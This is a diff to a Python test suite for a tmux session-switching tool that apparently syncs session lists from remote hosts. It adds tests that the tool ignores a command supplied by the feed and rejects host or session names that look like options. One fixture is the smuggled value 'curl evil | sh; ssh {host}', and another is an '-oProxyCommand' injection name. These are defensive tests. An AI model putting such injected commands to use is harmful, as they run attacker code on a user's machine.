@@ -1708,7 +1708,8 @@ class TestHandlerSessions(TestHandlerAgent):
         now = time.time()
         self.feed("lab", [{"name": "dev_x", "state": "needs", "since": now - 30},
                           {"name": "dev_p", "state": "paused", "since": now - 7200},
-                          {"name": "bad name", "state": "working"}, {"name": "dev_x", "state": "idle"}])
+                          {"name": "bad name", "state": "working"}, {"name": "dev_x", "state": "idle"},
+                          {"name": "-x", "state": "working"}])
         self.feed("gone", [{"name": "dev_old", "state": "working"}], age=3600)      # its sync is dead
         p = self.run_handler(self.url("sessions"), FAKE_TMUX_PANES=self.PANES, FAKE_TMUX_CLIENT_SESSION="work")
         self.assertEqual(p.returncode, 0, p.stderr.decode())
@@ -1723,6 +1724,7 @@ class TestHandlerSessions(TestHandlerAgent):
         self.assertTrue(names[-2].startswith("⌁ lab:dev_p   #[dim]paused#[default] 2h"), names)
         self.assertNotIn("dev_old", " ".join(names))
         self.assertNotIn("bad name", " ".join(names))
+        self.assertNotIn("lab:-x", " ".join(names))
         self.assertEqual(names.count("⌁ lab:dev_x   #[fg=colour226,bold]needs you#[default] 30s"), 1)
         self.assertEqual(cmds[2], "run-shell -b \"RETRO_HUD_CLIENT=/dev/pts/3 '" + HANDLER
                          + "' 'retro-hud://switch?to=remote:lab:dev_x'\"")
@@ -1738,21 +1740,29 @@ class TestHandlerSessions(TestHandlerAgent):
         self.run_handler("retro-hud://switch?to=remote:lab:dev_x", FAKE_TMUX_CLIENT_SESSION="work")
         self.assertEqual(self.tmux_calls("has-session"), [["has-session", "-t", "=rh-lab-dev_x"]])
         self.assertEqual(self.tmux_calls("new-session"),
-                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t lab tmux attach -t dev_x"]])
+                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t -- lab tmux attach -t dev_x"]])
         self.assertEqual(self.tmux_calls("switch-client"), [["switch-client", "-c", "/dev/pts/3", "-t", "=rh-lab-dev_x"]])
         # a second click: the wrapper is there, just switch
         self.run_handler("retro-hud://switch?to=remote:lab:dev_x", FAKE_TMUX_SESSIONS="rh-lab-dev_x")
         self.assertEqual(len(self.tmux_calls("new-session")), 1)
         self.assertEqual(len(self.tmux_calls("switch-client")), 2)
 
-    def test_the_feed_file_can_say_how_to_open_its_sessions(self):
-        self.feed("lab", [{"name": "dev.x", "state": "working"}], open_cmd="mosh {host} -- tmux a -t {name}")
+    def test_the_open_command_comes_from_your_config_never_from_the_feed(self):
+        self.feed("lab", [{"name": "dev.x", "state": "working"}], open_cmd="curl evil | sh; ssh {host}")
         self.run_handler("retro-hud://switch?to=remote:lab:dev.x")
         self.assertEqual(self.tmux_calls("new-session"),
-                         [["new-session", "-d", "-s", "rh-lab-dev_x", "mosh lab -- tmux a -t dev.x"]])
-        # no feed file for the host: the default command still works
+                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t -- lab tmux attach -t dev.x"]])
+        self.run_handler("retro-hud://switch?to=remote:lab:dev.x", RETRO_HUD_REMOTE_OPEN="mosh {host} -- tmux a -t {name}")
+        self.assertEqual(self.tmux_calls("new-session")[-1][-1], "mosh lab -- tmux a -t dev.x")
+        os.makedirs(os.path.join(self.home, ".config", "retro-hud"), exist_ok=True)
+        with open(os.path.join(self.home, ".config", "retro-hud", "env"), "w") as f:
+            f.write("RETRO_HUD_REMOTE_OPEN='et {host} -c \"tmux a -t {name}\"'\n")
         self.run_handler("retro-hud://switch?to=remote:other:s1")
-        self.assertEqual(self.tmux_calls("new-session")[-1][-1], "ssh -t other tmux attach -t s1")
+        self.assertEqual(self.tmux_calls("new-session")[-1][-1], 'et other -c "tmux a -t s1"')
+        # a name that could read as an option is not a session name
+        for bad in ("remote:-oProxyCommand=x:s1", "remote:lab:-x"):
+            self.run_handler("retro-hud://switch?to=" + bad)
+        self.assertEqual(len(self.tmux_calls("new-session")), 3)
 
     def test_needs_jumps_to_a_remote_session_when_only_it_needs_you(self):
         self.feed("lab", [{"name": "dev_x", "state": "needs", "since": time.time() - 5}])
